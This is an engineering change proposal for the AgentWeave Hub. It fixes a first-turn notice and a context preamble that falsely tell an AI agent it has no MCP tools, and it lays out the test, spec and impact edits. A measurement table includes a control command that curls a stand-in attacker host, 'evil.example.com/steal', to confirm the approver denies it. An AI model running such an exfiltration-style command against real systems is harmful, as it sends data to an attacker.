## Why

The first turn of **every agent ever created** opens with a sentence that is false:
*"[AgentWeave] Tool access: no MCP tools this turn"* — delivered while the Hub's MCP server is
injected and its tools are in the model's tool list. The notice is composed from `described_path`
(`hub/hub/api/v1/agent_trigger.py`, the `notices = [access_path_notice(described_path)]` line), which
takes the no-grounds branch because `harness_has_honoured_mcp` can only be true once a *previous*
run of the same agent has reported an adapter online. The injection beside it keys on `access_path`
instead, and is unconditional for a `claude` runner. So the two disagree exactly once per agent, and
the run is told it is empty while holding the tools.

> **R2 (2026-09-20) — the premise re-derived from the code, and it holds.** `agent_trigger.py`
> composes `notices = [access_path_notice(described_path)]` and, eighteen lines later, sets
> `mcp_command` under `if access_path == "mcp"`. Two different values, no reconciliation between
> them. `described_access_path`'s own docstring states the consequence outright: *"The first run
> against a fresh harness therefore reads the HTTP form while the server is in fact injected and its
> tools are in the model's tool list."* The existing suite already pins the defect as intended
> behaviour: `hub/tests/test_agent_trigger.py::test_trigger_injects_identity_env_and_tells_agent_the_access_path`
> asserts `"no MCP tools this turn" in prompt` and, three lines below,
> `captured_kwargs["mcp_command"][-1].endswith("mcp_server.py")` — in one test, on one turn, with
> `hub_client` unset. That test is the mechanical proof the defect is real, and the implementer
> should treat it as the specimen rather than re-deriving it.

> **R2 — but the notice is not the only false sentence in that turn.** See the second bullet of
> **What Changes**; the blast radius below was wrong and has been widened.

**This was decided on 2026-09-09 and never built** (`spec-queue/DECISIONS.md`,
`#### DAY-2 / F302 — the notice stops asserting, and does not start trusting`).

> **R2 correction — the verdict is not conditional, and this paragraph said it was.** R1 wrote that
> the verdict *"made itself conditional"*. Re-read against `DECISIONS.md`: the verdict's operative
> line is an unconditional **"DECIDED: drop the `no MCP tools this turn` sentence."** The F299
> dependency appears under the heading *"What makes this cheaper than it was this morning"* — a
> cost note, not a gate. Nothing was waiting on it. The measurement below is still worth having,
> because it says the HTTP form this change steers a fresh agent toward is one the agent can now
> actually use; it is not the thing that unblocks the change.

The verdict's cheapness note says the fix became cheaper once the workspace approver learned to
recognise the run's own Hub URL, *"so the HTTP form the notice steers a fresh agent toward is one
the agent can actually use."* **That is now true, and R2 re-measured it independently on 2026-09-20**
at `d7f2694`, by calling `_decide` directly with `AW_WORKSPACE_DIR` and `HUB_URL` set as the Hub
sets them (`agent_trigger.py` sets both: `env["AW_WORKSPACE_DIR"] = effective_work_dir`, and
`env["HUB_URL"]` from the explicit value or the observed port):

| command | verdict | reason |
|---|---|---|
| `Bash` — `curl -H "Authorization: Bearer $AW_RUN_TOKEN" $HUB_URL/api/v1/agent-actions/tasks` | **allow** | inside your workspace |
| `PowerShell` — `curl.exe -H "Authorization: Bearer $env:AW_RUN_TOKEN" "$env:HUB_URL/api/v1/agent-actions/tasks"` | **allow** | inside your workspace |
| control — `curl -s http://evil.example.com/steal` | deny | is a network address |
| control — `curl -s http://127.0.0.1:9/api/v1/agent-actions/tasks` | deny | is a network address |
| control — `echo hi > ../outside.txt` | deny | is outside your workspace |

**`HUB_URL` is load-bearing in the measurement itself and a probe that leaves it unset gets a false
result.** `_judge_word`'s rule 2 trusts a `$HUB_URL` reference only when `trusted and base` — `base`
being `os.environ["HUB_URL"]` in the approver's *own* process. R2 ran both ways: with `HUB_URL`
unset, all three allowed shapes flip to **deny**, with the misleading reason *"contains a variable,
'~' or a command substitution that the shell expands when it runs"*. Any later round re-running this
must export `HUB_URL` or it will conclude the precondition is unmet.

Two further things the measurement establishes, neither of which R1 recorded:

- **The two localhost controls now deny as *network addresses*, not as filesystem paths.** The
  `_ABSOLUTE_PATH_RE`-eats-the-URL-scheme reason that `DECISIONS.md` 1e filed as its own finding is
  gone from these shapes.
- **`DECISIONS.md` 1d's other live verdict is now moot, and this change must say so.** 1d decided
  *"change the notice to instruct the `python -c` shape now"*, because at the time `python -c`
  reading `os.environ` was *"the one shape of the four that `_decide` already allows"*. The durable
  half of that verdict has since shipped: the `curl` shape the notice already instructs is allowed,
  in both dialects, measured above. So this change correctly leaves the instructed shape alone —
  but that is a **superseded verdict, not an ignored one**, and it is recorded here so R3 and the
  implementer do not reopen it. (`python -c` remains allowed too: verified, same run.)

The cost is measured, not theoretical. `openspec/explorations/2026-09-14-the-first-turn-has-its-tools.md`
records all four LoopEngine agents opening on the false sentence, and the Architect keeping to
`curl` and payload files for **ten runs after the notice healed** — it learned its payload shape from
two 422s, and 9 of its 21 `agent_wrote_outside_workspace` warnings came from writing payload files to
`/tmp` and `%TEMP%`. It used the MCP `ask_user` in the same session, so the tools were demonstrably
there throughout. **The notice heals on turn two; the agent does not.**

## What Changes

- **The no-MCP branch of `access_path_notice` (`hub/hub/launchability.py`) stops asserting the
  absence of a tool surface.** It keeps everything the plane requirement asks for — that the plane is
  reachable over HTTP, the base address, the credential's variable name, how the credential is
  presented, and where the operations are described — and drops only the clause claiming the run has
  no MCP tools this turn.
- **The canonical context's tool-section preamble (`hub/hub/api/v1/agents.py`,
  `_tool_surface_lines`) stops asserting the same absence.** *Added by R2; R1's Impact section
  explicitly excluded this file and that exclusion was wrong.* The HTTP rendering of the tool
  inventory opens with *"**No AgentWeave tools are injected this turn**, so each capability below is
  one HTTP request instead."* That is the same unfounded claim of absence as the notice's, in the
  same turn, to the same agent, from the same value: `agent_trigger.py` passes `described_path` to
  `_render_hub_agent_context(access_path=...)`, which threads it to `_tool_surface_lines`. It is
  **stronger** than the notice's clause — "no AgentWeave tools are injected" is flatly false, since
  injection is exactly what happened — and it reaches the model as text ahead of the operator's
  message: the rendered context is written to `.agentweave/context/<agent>.md` and passed as
  `--append-system-prompt-file` for `claude` and `model_instructions_file` for `codex`
  (`hub/hub/runner_commands.py`). **Fixing only the notice would leave this change violating its own
  new scenario — *"No grounds means no denial either"* — on the day it lands**, and would leave the
  measured behaviour this change exists to stop (an agent adopting `curl` because its first turn
  told it it had nothing) sourced from a sentence nobody edited. The same minimal shape as D1
  applies: drop the absence claim, keep the address, the credential variable, its presentation, the
  read-from-your-own-environment instruction and the JSON/refusal sentence. See design **D6**.
- **The `agent-capability-plane` requirement gains the symmetric prohibition it never had.** Today it
  forbids asserting a tool surface is *present* without grounds; it says nothing about asserting one
  is *absent*, which is why the false sentence was spec-compliant. The delta makes both directions
  unassertable without grounds.
- **The same requirement's false mechanism is corrected, as a separate and already-mandated edit.**
  Its prose states *"the `cli` path's `acceptEdits` has no approver to overrule a harness that
  **statically refuses** an interpolated credential (F301)."* `DECISIONS.md` 1c measured that false —
  with the approval gate removed, that exact command executes, and a bare literal `curl` with no
  variable is denied identically — and 1d requires the correction to ride *"in the same delta that
  carries the notice change"*. The requirement's **conclusion** (unreachable on `cli`) holds; only
  the stated reason is wrong.
- **The two tests that pin the denial are restaged** to assert what the notice must now contain
  rather than what it must say: `hub/tests/test_agent_trigger.py` asserts `"no MCP tools this turn"`
  in a built prompt in two places — `test_trigger_injects_identity_env_and_tells_agent_the_access_path`
  and `test_a_run_without_mcp_is_described_the_operations_it_can_actually_perform`. *R2 confirmed
  both exist, both leave `hub_client` unset, and both therefore sit on exactly the no-grounds path
  this change is about.*

## Capabilities

### New Capabilities

None.

### Modified Capabilities

- `agent-capability-plane`: **`A run is told the access path it actually has`** gains a normative
  clause and **two** scenarios forbidding assertion of a tool surface's *absence* without grounds,
  matching the existing prohibition on asserting its presence *(R2: R1 wrote "a scenario"; the delta
  adds two — `No grounds means no denial either` and `A run holding the tools is not told it is
  empty`)*. **`A run whose harness cannot use MCP is told how to reach the plane`** has its F301
  mechanism sentence corrected; its normative SHALL is unchanged — *R2 diffed it byte for byte
  against `openspec/specs/` and it is identical.*

## Impact

*R2 rewrote this section. R1's version named one product file and asserted the change touched
nothing else; it touches two.*

- `hub/hub/launchability.py` — `access_path_notice`, the no-MCP branch's returned string only. The
  comment above that branch already explains the credential-naming prohibition and must survive.
- `hub/hub/api/v1/agents.py` — `_tool_surface_lines`, the `else` (non-MCP) preamble string only.
  **Added by R2.** No route shape changes and no schema changes; this is a helper that composes
  context text. Its `access_path: str = "mcp"` default and every caller outside a run are untouched.
- `hub/tests/test_agent_trigger.py` — two assertions on the denial text (named above).
- `hub/tests/test_launchability.py` — **R2: none of its assertions pin the removed clause**, so
  R1's "restage anything that pins it" would have found nothing here. What it *does* have is
  `test_a_run_without_mcp_is_not_told_it_cannot_act`, a test written for this exact purpose which
  the current clause slipped past because it only checks older denial wordings (it asserts
  `"no AgentWeave tool surface is available" not in notice` and phrases like `"cannot send
  messages"`). That is the natural home for the new negative assertion, and tasks 3.2 now names it.
- `hub/tests/test_agent_facing_text.py` — **R2: references `access_path_notice` but pins neither the
  clause nor the HTTP fields**; no edit is expected. Named so a round that finds nothing there
  knows that is the correct answer rather than a missed search.
- `hub/tests/test_tool_surface_matches_server.py` — **R2: asserts on the rendered context text**
  (`AW_RUN_TOKEN`, `HUB_URL`, `Authorization: Bearer`, plus sentinel-leak negatives). It does not
  pin the context preamble today, and it is where a context-side assertion for the `agents.py` edit
  belongs.
- `scripts/drive/t_d1_0909_together.py` — **R2: a drive script whose detector is
  `injected = "No AgentWeave tools are injected this turn" in text`.** Not a test, so nothing fails
  if it is missed; it simply starts reporting `False` forever. It must be updated with the
  `agents.py` string or its detector rewritten.
- `openspec/specs/agent-capability-plane/spec.md` — two requirements, via the delta.
- **No migration. No route. Nothing under `hub/ui/`, so no `make ui` and nothing reaches the
  operator's live app on reload.** *R2 re-derived this: `agents.py` is under `api/v1/` but the edit
  is inside a text-composing helper, not a route handler or a response model; `.claude/rules/` gates
  `hub/hub/mcp_server.py`, models/migrations and `hub/ui/`, none of which this change touches.*

## Non-Goals

Stated explicitly, because several of these are the ways this change could quietly become a
different one. **R2 kept all five and dissents from one — see design D2.**

- **The MCP branch is not granted on trust.** A fresh agent still reads the HTTP form. The decision
  is explicit that granting the MCP rendering without grounds is *"the same disease pointed the other
  way"*, and would be wrong on precisely the harness the notice exists for. `described_access_path`'s
  grounds logic is untouched.
- **Containment does not move.** The requirement's own scenario — *"A truer description does not
  silently widen permission"* — governs this change directly. `resolve_access_path`, `mcp_command`
  and the permission posture are untouched; only the text changes.
- **The two branches are not merged into one always-true notice.** A single text saying "use the
  MCP tools if they are in your tool list, otherwise HTTP" was considered and is **rejected here**:
  it is a larger behavioural change to the grounds mechanism than the verdict authorised, and the
  verdict deliberately chose "describe without claiming" over "describe both". Recorded so a later
  round does not mistake it for an oversight.
- **`harness_has_honoured_mcp`'s permanent-positive latch is not fixed.** It can never return to
  false once true (`hub/hub/launchability.py`, a `.limit(1)` existence check with no recency, whose
  only writer only ever sets the column). That is **F340**, open, and belongs to its own change.
- **`hub_client` is not given a UI control**, and the legacy runner registries are not cleaned up
  (**F393**).
